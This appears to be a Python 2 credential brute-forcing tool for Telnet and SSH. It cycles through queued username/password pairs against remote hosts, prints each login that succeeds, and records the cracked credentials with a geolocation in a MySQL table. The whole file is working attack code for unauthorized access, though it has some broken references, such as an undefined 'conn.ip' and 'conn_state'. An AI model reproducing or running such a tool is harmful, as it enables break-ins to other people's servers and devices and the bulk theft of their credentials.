#!/usr/bin/python
#encoding:utf-8

import pexpect
import MySQLdb
import pxssh
import IP


class telnetConnection:
    def __init__(self,ip_port,auth_queue):
        self.new_state(TELNETconn_state)
        self.auth_queue = auth_queue
        self.ip_port = ip_port
        self.index = 0
        self.auth = None
        self.child = None


    def new_state(self,newstate):
        self._state = newstate

    def run(self):
        self._state._run(self)

    def exit(self):
        if self.child:
            self.child.close(force=True)

class sshConnection:
    def __init__(self,ip_port,auth_queue):
        self.new_state(SSHconn_state)
        self.auth_queue = auth_queue
        self.ip_port = ip_port
        self.index = 0
        self.auth = None
        self.child = None

    def new_state(self,newstate):
        self._state = newstate

    def run(self):
        self._state._run(self)

    def exit(self):
        if self.child:
            self.child.close(force=True)

class SSHconn_state:
    @staticmethod
    def _run(conn):
        try:
            conn.auth = conn.auth_queue.pop()
        except:
            conn.new_state(None)
            return
        try:
            username,password = conn.auth
            s = pxssh.pxssh()
            if s.login(conn.ip,username,password):
                conn.new_state(confirm_state)
        except ExceptionPxssh,e:
            print "Error: %s" % e
            conn.new_state(SSHconn_state)
        except:
            conn.new_state(None)



class TELNETconn_state:
    @staticmethod
    def _run(conn):
        try:
            conn.child = pexpect.spawn("telnet %s" % conn.ip_port)
            index = conn.child.expect(["sername:","nter:","ccount:","ogin:","eject",pexpect.TIMEOUT,pexpect.EOF],timeout=30)
            if index < 4:
                #print "Got flag %s" % conn.ip_port
                conn.new_state(user_state)
            else:
                conn.new_state(None)
        except:
            conn.new_state(None)

class user_state:
    @staticmethod
    def _run(conn):
        try:
            conn.auth = conn.auth_queue.pop()
        except:
            conn.new_state(None)
            return

        user = conn.auth[0]
        conn.child.sendline(user)
        index = conn.child.expect(["ssword:","sername:","nter:","ccount:","ogin:",pexpect.TIMEOUT,pexpect.EOF],timeout=30)
        if index == 0:
            conn.new_state(TELNETpasswd_state)
        elif index < 5:
            conn.new_state(user_state)
        else:
            conn.exit()
            conn.new_state(TELNETconn_state)

class TELNETpasswd_state:
    @staticmethod
    def _run(conn):
        if conn.auth:
            passwd = conn.auth[1]
        else:
            conn.new_state(None)
            return
        conn.child.sendline(passwd)
        index = conn.child.expect([r"[>$~/]","sername:","nter:","ccount:","ogin:","ssword:",pexpect.TIMEOUT,pexpect.EOF],timeout=30)
        if index == 0:
            print "Got password %s:%s %s:%s" % (conn.ip_port[0],conn.ip_port[1],conn.auth[0],conn.auth[1])
            conn.new_state(confirm_state)
        elif index < 5:
            conn.new_state(user_state)
        else:
            conn.new_state(conn_state)

class confirm_state:
    @staticmethod
    def _run(conn):
        try:
            user,passwd = conn.auth
            if conn.auth == ("user","password"):
                conn.new_state(None)
                return
            db = MySQLdb.connect("localhost","root","","auth",charset="utf8")
            cursor = db.cursor()
            cursor.execute("INSERT INTO auth_table(ip,port,username,password,loc) values('%s','%d','%s','%s','%s')" % (conn.ip_port[0],conn.ip_port[1],user,passwd,IP.find(conn.ip_port[0])))
            db.commit()
            print "[report] One result import to database"
        except:
            db.rollback()
        conn.new_state(None)
        db.close()


